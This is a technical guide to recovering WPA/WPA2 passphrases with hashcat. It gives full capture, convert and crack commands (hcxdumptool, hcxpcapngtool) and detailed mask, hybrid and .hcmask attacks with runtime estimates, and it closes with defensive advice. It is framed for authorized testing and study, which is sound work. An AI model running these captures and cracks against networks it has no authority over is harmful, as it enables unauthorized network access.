# Hashcat Masks & Hybrid Attacks for WPA

**Scope:** Authorized testing only — your own gear, sanctioned CTFs/competitions, or OSWP study. Every capture you feed hashcat must come from a network on your allowlist. Mode 22000 is the modern WPA/WPA2 PBKDF2-PMKID+EAPOL hash. WPA3-SAE PSKs cannot be recovered this way (there is no offline hash mode), so this document is WPA/WPA2 only.

**Reference hardware for all time math below: ~185,000 H/s** (a realistic Apple-Silicon Metal rate for `-m 22000`). WPA2 is a slow PBKDF2(SHA1, 4096 iterations) hash — this is why mask discipline matters more here than for any fast hash.

---

## 1. Concept (brief)

A **mask attack** (`-a 3`) is a *targeted* brute force. Instead of trying every byte in every position, you encode what you know about a password's **structure** — "8 digits", "capital letter then 6 lowercase then a 4-digit year" — and hashcat only walks that keyspace. It has **no disadvantage** versus pure brute force (a mask can describe the full keyspace) and an enormous advantage when you know the shape.

A **hybrid attack** glues a wordlist to a mask: `-a 6` appends a mask to each word (`word` + `?d?d`), `-a 7` prepends it (`?d?d` + `word`). This is how you catch `Summer2024`, `password!`, `linksys01`.

The whole game with WPA is **keyspace economy**: at 185k H/s you get ~**16 billion guesses/day**. A mask that fits the target finishes; a careless one runs for years. See the time table in §8.

---

## 2. The full WPA pipeline (capture → convert → crack)

Masks only matter once you have an `.hc22000` file. Canonical workflow (authorized AP only):

```bash
# 0. Free the interface (NetworkManager/wpa_supplicant hold it)
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

# 1. Capture (hcxdumptool — do NOT use airodump/third-party monitor tools per hashcat wiki)
sudo hcxdumptool -i wlan1 -w dumpfile.pcapng --rds=1 -F

# 2. Convert to the 22000 hash (hcxpcapngtool). Do NOT wpaclean/merge/edit the pcapng first.
hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
#   -E essids.txt   also dumps observed ESSIDs -> feed them into wordlists/rules

# 3. (optional) Split by type so you attack the cheapest first
hcxhashtool -i hash.hc22000 --type=1 -o pmkid.hc22000    # PMKID only  (WPA*01 lines)
hcxhashtool -i hash.hc22000 --type=2 -o eapol.hc22000    # EAPOL only  (WPA*02 lines)
hcxhashtool -i hash.hc22000 --mac-ap=112233445566 -o target.hc22000   # one AP

# restore networking when done
sudo systemctl start NetworkManager.service
```

Notes that bite people:
- **No output after conversion** usually means the required frames (a valid PMKID, or a complete M1–M2/M2–M3 EAPOL pair) were never in the capture. Re-capture; don't retry the converter.
- PMKID (`WPA*01`) and EAPOL (`WPA*02`) can coexist in one file; hashcat reuses PBKDF2 work across them.
- `-m 22001` only *verifies* a known 64-hex PMK — it does **not** recover a passphrase. Ignore it for cracking.

---

## 3. Mask syntax — the core

### 3.1 Built-in charsets (one `?X` = one password position)

| Token | Set | Size |
|-------|-----|------|
| `?l` | `abcdefghijklmnopqrstuvwxyz` | 26 |
| `?u` | `ABCDEFGHIJKLMNOPQRSTUVWXYZ` | 26 |
| `?d` | `0123456789` | 10 |
| `?h` | `0123456789abcdef` (lowercase hex) | 16 |
| `?H` | `0123456789ABCDEF` (uppercase hex) | 16 |
| `?s` | ``<space>!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~`` | 33 |
| `?a` | `?l?u?d?s` | 95 |
| `?b` | `0x00`–`0xff` (all bytes) | 256 |

A literal character is itself; a literal `?` is written `??`.

### 3.2 How a mask maps to a password

Each token fills **exactly one** position. An 8-char target needs **8 tokens**. WPA floor is 8 (hashcat auto-rejects anything shorter for `-m 22000`), ceiling is 63.

```bash
# every 8-digit string 00000000..99999999   (10^8 keyspace)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Capital + 6 lowercase + single digit  e.g. Hunter7
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?l?d

# Name-like root + 4-digit year via literals: Spring2024
hashcat -m 22000 hash.hc22000 -a 3 Spring?d?d?d?d
```

**Candidate order:** hashcat optimizes so the *first four* positions iterate fastest. Order is deterministic within a full keyspace scan but not strictly left-to-right in small keyspaces — don't rely on ordering for partial runs.

### 3.3 Custom charsets `-1 -2 -3 -4` (referenced as `?1 ?2 ?3 ?4`)

Define up to four of your own sets. Each can mix literals + built-ins + a `.hcchr` file.

```bash
# ?1 = lowercase + uppercase + digits (62 chars). 8-position mask from it.
hashcat -m 22000 hash.hc22000 -a 3 -1 ?l?u?d ?1?1?1?1?1?1?1?1

# ?1 = digits plus a–f  (useful for lower-hex-ish router defaults)
hashcat -m 22000 hash.hc22000 -a 3 -1 ?dabcdef ?1?1?1?1?1?1?1?1

# Two custom sets: ?1 = vowels, ?2 = "!@#" symbols
hashcat -m 22000 hash.hc22000 -a 3 -1 aeiou -2 '!@#' ?u?l?l?1?l?l?d?2
```

**Gotcha:** a custom charset you declare but never reference in the mask is silently wasted (`-1 ?d` with a mask that only uses `?d` does nothing). Conversely, referencing `?1` without defining `-1` errors out.

---

## 4. `--increment` — variable length in one run

A single mask = **one fixed length**. `-i` / `--increment` re-runs the mask, growing from a start length to the mask's length, one token at a time.

```bash
# try all-digit passwords of length 8, 9, and 10
hashcat -m 22000 hash.hc22000 -a 3 -i --increment-min=8 --increment-max=10 \
        ?d?d?d?d?d?d?d?d?d?d
```

Rules that trip people up:
- The **mask length is the hard cap**. `--increment-max` can't exceed it, so the mask must be written at least as long as your longest target. Above, the mask is 10 tokens → max 10.
- `--increment-min`/`--increment-max` **require** `-i`; alone they error `increment min is only supported with increment switch`.
- For `-m 22000`, `--increment-min=8` is *optional*: hashcat already refuses <8-char WPA candidates. Set it anyway for clarity, or to skip straight to a known floor like 9 or 10.
- Increment **multiplies total work** — it runs length 8 *then* 9 *then* 10, not a blended set. Budget the sum (see §8).

---

## 5. Hybrid attacks — wordlist + mask

The sweet spot for WPA, because real human PSKs are `word + digits/symbols`.

```bash
# -a 6  : WORD then MASK   ->  password00 .. password99 ; linksys2024
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d
hashcat -m 22000 hash.hc22000 -a 6 rockyou.txt  ?d?d?d?d          # + 4-digit year
hashcat -m 22000 hash.hc22000 -a 6 words.txt     ?d?d?s           # 2 digits + a symbol

# -a 7  : MASK then WORD   ->  00password .. 99password ; 2024summer
hashcat -m 22000 hash.hc22000 -a 7 ?d?d?d?d wordlist.txt
```

Keyspace of a hybrid = `len(wordlist) × size(mask)`. A 14M-line rockyou × `?d?d?d?d` (10^4) = 1.4×10^11 candidates → ~9 days at 185k H/s. So keep the mask **small** in hybrid mode, or cut the wordlist to likely roots (the ESSID, vendor, local sports teams, `-E essids.txt` output).

Custom charsets work in hybrid too:
```bash
# word + (symbol)(year)   e.g.  summer!2024
hashcat -m 22000 hash.hc22000 -a 6 -1 '!@#$' words.txt ?1?d?d?d?d
```

**Rules as a lighter alternative:** `-a 0 wordlist -r rules/best64.rule` often beats hybrid for append/leet mutations and costs far less than a 4-token mask. Try `best64.rule`, then `rockyou-30000.rule`/`dive.rule` for breadth. Hybrid wins when the suffix is *structured* (exactly 4 digits), rules win when it's *mutational* (capitalize, leet, append `!`).

---

## 6. `.hcmask` files and charset (`.hcchr`) files

### 6.1 `.hcmask` — batch many masks in one run

Line format: `[?1,][?2,][?3,][?4,]mask`. Custom charsets live **on the same line** (you cannot pass `-1` on the CLI for a mask *file* — it errors `Custom-charset 1 is undefined`).

```text
# wpa_patterns.hcmask  (# starts a comment)
?d?d?d?d?d?d?d?d
?d?d?d?d?d?d?d?d?d?d
?u?l?l?l?l?l?l?d
Spring?d?d?d?d
Summer?d?d?d?d
?l?d,test?1?1?1          # ?1 = lowercase+digits for THIS line only
\#hashtag?d?d            # \# = literal '#'; \, = literal comma
```
```bash
hashcat -m 22000 hash.hc22000 -a 3 wpa_patterns.hcmask
```
hashcat runs each line in order — ideal for an ordered "try the likely shapes first" playbook.

### 6.2 `.hcchr` — reusable charset files

A `.hcchr` is just the raw characters of a set (hashcat ships many under `charsets/`). Reference it where a custom charset is expected:

```bash
hashcat -m 22000 hash.hc22000 -a 3 \
  -1 charsets/special/German/de_ISO-8859-1-special.hcchr ?1?1?1?l?l?d?d?d
```
Inside an `.hcmask` line you can even give the file path as the charset field.

### 6.3 Generating masks/candidates with `maskprocessor` (`mp64`)

`mp64` is hashcat's standalone per-position word generator — use it to *build* candidate lists or to reason about keyspace, then pipe into hashcat or `--stdout`.

```bash
mp64 -1 ?l?u ?1?1?1?1                  # all 4-char mixed-case words
mp64 ?d?d?d?d?d?d?d?d | head           # preview 8-digit space
mp64 -i 4:8 ?l?l?l?l?l?l?l?l           # lengths 4..8 (mp64's -i takes start:stop)
```
Caveat: `mp64 -i` counts **output length**, not mask tokens — run it once per length if you're feeding a rule engine.

### 6.4 PACK `policygen` — masks that obey a password policy

`policygen` (from PACK) emits `.hcmask` files constrained by min/max length and required character classes — handy for "corp policy: 8–10 chars, ≥1 digit, ≥1 upper":
```bash
policygen.py --minlength=8 --maxlength=10 --mindigit=1 --minupper=1 \
             -o policy.hcmask
hashcat -m 22000 hash.hc22000 -a 3 policy.hcmask
```
Limits: PACK only knows built-in charsets and has no "must-include-these-exact-chars" option; hand-edit for custom sets.

### 6.5 Sanity-check any mask before committing GPU time

```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d --keyspace   # prints keyspace
hashcat -a 3 ?u?l?l?l?l?d?d?d --stdout | head                     # preview candidates
```
Divide keyspace by your benchmarked H/s to get runtime **before** you start.

---

## 7. Decision order — how a pro sequences a WPA crack

Attack cheapest-and-likeliest first. Rough order:

1. **Benchmark + estimate.** `hashcat -b -m 22000` for your real H/s; `--keyspace` every planned mask.
2. **Targeted dictionaries first** (cheap, high hit-rate): `rockyou.txt`, then WPA-specific lists (`-a 0`). Seed with the **ESSID** and vendor words.
3. **Rules on those dictionaries:** `-r best64.rule`, then larger rulesets. Catches `Password1!`, `Summer2024`.
4. **Structured hybrids:** `-a 6 words ?d?d?d?d` (year/number suffix), `-a 7 ?d?d?d?d words` (prefix). Keep masks ≤4 tokens.
5. **Numeric / structured masks** (`-a 3`), ordered by likelihood for the locale:
   - 8-digit then 9/10-digit (`?d…` with `-i`) — phone numbers, dates, numeric PSKs.
   - Known **default-router patterns** (vendor-specific: fixed prefix + hex/digits, e.g. many ISP routers = 8–10 uppercase hex → `?H?H?H?H?H?H?H?H`).
   - Date formats: `?d?d?d?d?d?d?d?d` already covers `DDMMYYYY`; add literals for `??-??-????` style only if punctuation is in-scope.
6. **Broad masks last** (`?a?a…`, mixed 8+) only if time/keyspace is sane — usually it is **not** at 185k H/s (see §8).
7. **Checkpoint & resume:** every real run uses a session so you can stop/resume:
   ```bash
   hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d \
           --session wpa1 -w 3 -O --status --status-timer=30
   hashcat --session wpa1 --restore        # resume later
   ```

**Rule of thumb:** for WPA, numeric and `word+digits` patterns crack the large majority of *crackable* home PSKs. If a 10-digit numeric sweep + rockyou+rules + a few hybrids fail, the passphrase is probably strong and you stop — that's the correct (defensive) conclusion, not a cue to brute `?a?a?a?a?a?a?a?a`.

---

## 8. Time math at ~185,000 H/s

Runtime ≈ keyspace ÷ rate. At 185k H/s you cover **~1.6×10^10 guesses/day**.

| Mask | Keyspace | Time @185k H/s |
|------|----------|----------------|
| `?d?d?d?d?d?d?d?d` (8 digits) | 10^8 = 100M | **~9 minutes** |
| `?d` ×9 | 10^9 = 1B | **~1.5 hours** |
| `?d` ×10 | 10^10 = 10B | **~15 hours** |
| `?d` ×11 | 10^11 | **~6.3 days** |
| `?d` ×12 | 10^12 | **~62 days** |
| `?H` ×8 (8 upper-hex, router default) | 16^8 ≈ 4.29B | **~6.4 hours** |
| `?l` ×8 (8 lowercase) | 26^8 ≈ 2.09×10^11 | **~13 days** |
| `?l?d` ×8 (36 set, 8 long) | 36^8 ≈ 2.82×10^12 | **~176 days** |
| `?a` ×8 (full 95-char, 8 long) | 95^8 ≈ 6.63×10^15 | **~1,100+ years** |
| rockyou (14M) × `?d?d?d?d` (`-a 6`) | 1.4×10^11 | **~8.8 days** |
| rockyou (14M) × `?d?d` (`-a 6`) | 1.4×10^9 | **~2.1 hours** |

Takeaways: **all-digit up to 10 is tractable** (≤~15 h). **8-char lowercase is ~2 weeks** — borderline. **Anything mixed-alphanumeric ≥8 is effectively uncrackable** at this rate, which is exactly why mask targeting (not blind brute force) is the whole skill. A faster GPU rescales linearly: an RTX 4090 (~2,600 kH/s ≈ 14×) turns the 13-day `?l`×8 into <1 day; a 5090 (~3,100–3,350 kH/s) more still. Always benchmark your own card: `hashcat -b -m 22000`.

---

## 9. Pro tips for speed

- **`-O` (optimized kernels):** big speedup but caps password length (often 31 for many modes). Fine for WPA ≤ that cap. Start with `-O`; drop it only if your target length exceeds the limit.
- **`-w 3` or `-w 4` (workload):** `3` = "high" (default for dedicated cracking rigs), `4` = "nightmare" (max, laggy desktop). Use `3` on a machine you also use, `4` on a dedicated box.
- **Attack the smaller keyspace first** by splitting PMKID vs EAPOL and per-AP with `hcxhashtool`.
- **Prune the wordlist** in hybrids to plausible roots (ESSID, vendor, locale words) — hybrid cost is linear in wordlist size.
- **`--keyspace` + benchmark = a go/no-go gate.** Never launch a mask you haven't time-estimated.
- **`--session` + `--restore`** on every long run; **`--status --status-timer=30`** to watch ETA.
- **`--markov-hcstat2`/Markov** ordering is on by default and front-loads likely candidates — leave it enabled for masks.
- **Temperature/thermals** on a laptop GPU throttle H/s hard; `-w 2` can paradoxically sustain higher real throughput than `-w 4` if you're thermal-limited. Watch `--status` for a decaying rate.
- **Keep a curated `wpa_patterns.hcmask`** of the shapes that actually hit (numeric 8–10, `Word####`, `????2024`, vendor-hex) and run it as your standing first pass.

---

## 10. Defense (the point of all of this)

Each attack above has a direct mitigation. Pair them in any report:

- **Length beats complexity.** At 185k H/s, 8 mixed-alphanumeric chars is already ~centuries; a **random 16+ character** PSK (or a 5–6 word diceware-style passphrase) is unreachable by any mask or hybrid. Generate it with a **password manager**, never a human-memorable pattern.
- **Avoid the structures masks target:** no phone numbers, dates, `Word+Year`, ESSID-derived PSKs, or vendor-default hex. Those are precisely the cheap masks in §8.
- **Change default router PSKs.** Vendor-default patterns (fixed prefix + short hex/digits) are the first structured masks a tester tries and often fall in hours.
- **Prefer WPA3-SAE.** SAE (Dragonfly) makes each guess require a **live exchange with the AP** — one online guess at a time — which removes the offline mask/hybrid attack entirely. Caveat: **WPA3 transition mode still accepts WPA2 clients**, so a captured WPA2 4-way handshake remains offline-crackable; deploy SAE-only (or SAE and WPA2-PSK on *separate* SSIDs) where feasible. Note the Dragonblood research: SAE is susceptible to *password-partitioning* (side-channel/timing) attacks and DoS, so patch APs/clients and use side-channel-resistant implementations (security parameter k ≥ 40 per RFC 7664).
- **Detection, not just prevention:** monitor for **deauthentication floods** and **rogue/evil-twin APs** (duplicate ESSID on a different BSSID, unexpected channel, mismatched vendor OUI) — these precede handshake/PMKID capture and evil-twin credential phishing. A WIDS/WIPS or even periodic `hcxdumptool`-style scans of *your own* airspace surfaces them. (Evil-twin coverage here is **detection + concept only** — do not build a credential-harvesting portal.)
- **Operational:** rotate the PSK after contractor/guest access, segment IoT onto its own SSID, and disable WPS (Pixie-Dust/`reaver` bypass the PSK strength entirely).

---

## Sources

- hashcat Mask Attack wiki — https://gwern.net/doc/www/hashcat.net/87fbd82f8b8794603fb3b0cca174c21310b4741b.html (official hashcat wiki content: charsets, custom charsets, `--increment`, `.hcmask` format, keyspace examples)
- hashcat official WPA/WPA2 cracking wiki (mode 22000 workflow) — https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- hashcat forum — "Mask Attacks with Mask File and Custom Charset" (`.hcmask` charset rules) — https://hashcat.net/forum/thread-8281.html
- hashcat forum — `--increment-min`/`--increment-max` usage and WPA floor — https://hashcat.net/forum/printthread.php?tid=8175
- maskprocessor (`mp64`) man page — https://manpages.ubuntu.com/manpages/jammy/man1/mp64.1.html
- Kali Tools — hcxtools (capture→convert→crack pipeline) — https://www.kali.org/tools/hcxtools
- hcxpcapngtool man page — https://dyn.manpages.debian.org/trixie/hcxtools/hcxpcapngtool.1.en.html
- hashcat(1) man page (flags: `-a`, `-w`, `-O`, `--keyspace`, `--session`) — https://dyn.manpages.debian.org/trixie/hashcat/hashcat.1
- Black Hills Information Security — Hashcat cheat sheet (attack-mode reference) — https://www.blackhillsinfosec.com/?p=34536
- LabEx — "Perform a Hybrid Attack in Hashcat" (`-a 6`/`-a 7` examples) — https://labex.io/tutorials/kali-perform-a-hybrid-attack-in-hashcat-594509
- hashcat forum — RTX 4000-series WPA2 (`-m 22000`) benchmarks — https://hashcat.net/forum/post-56468.html
- hashcat forum — RTX 3070 WPA2 benchmark — https://hashcat.net/forum/post-50605.html
- Vanhoef & Ronen, "Dragonblood: Analyzing WPA3's SAE Handshake" — https://dl.aircrack-ng.org/wiki-files/doc/additional_papers/dragonblood.pdf
- Wi-Fi Alliance — WPA3 Security Considerations (SAE guidance, RFC 7664 k≥40, transition-mode caveat) — https://wpa3.mathyvanhoef.com/WPA3_Security_Considerations_201911.pdf
